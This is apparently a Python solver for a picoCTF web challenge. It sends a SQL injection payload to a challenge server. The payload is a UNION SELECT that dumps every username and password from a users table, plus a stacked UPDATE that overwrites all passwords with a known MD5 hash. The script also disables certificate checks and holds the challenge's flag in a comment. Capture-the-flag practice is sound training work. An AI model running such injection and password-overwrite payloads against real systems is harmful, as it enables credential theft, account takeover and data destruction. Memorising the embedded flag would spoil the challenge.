import json
import re
import string
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print


s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

s.cookies["PHPSESSID"] = "e59d546ee5f0efb0321744b35e25060b"


def main() -> None:
    URL = "http://lonely-island.picoctf.net:59226/vuln.php?q="

    PAYLOAD = "' UNION SELECT 'Username->'||username||'~'||password, '' FROM users; UPDATE users SET password='81dc9bdb52d04dc20036dbd8313ed055'--"

    response: r.Response = s.get(URL + quote(PAYLOAD))

    print(text := response.text)
    print(response.status_code)

    flags = re.findall(r"picoCTF\{[^}]+\}", text)

    print(set(flags))


# picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}


if __name__ == "__main__":
    main()
import requests as r
